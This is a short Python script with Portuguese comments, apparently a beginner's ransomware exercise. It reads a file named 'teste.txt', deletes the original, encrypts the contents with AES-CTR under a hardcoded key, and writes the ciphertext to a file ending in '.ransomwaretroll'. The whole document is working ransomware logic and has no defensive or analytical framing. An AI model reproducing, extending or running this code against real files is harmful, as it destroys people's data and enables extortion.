import os
import pyaes

#abri arquivo alvo

file_name = 'teste.txt'
file_open = open(file_name, 'rb')
file_data = file_open.read()
file_open.close()

#remover arquivo original

os.remove(file_name)

#definir  chave de encriptacao

key = b'testeransomwares'
aes = pyaes.AESModeOfOperationCTR(key)
#encripitei
crypto_data = aes.encrypt(file_data)


#novo arquivo

new_file = file_name +'.ransomwaretroll'
new_file = open(f'{new_file}', 'wb')
new_file.write(crypto_data)
new_file.close()
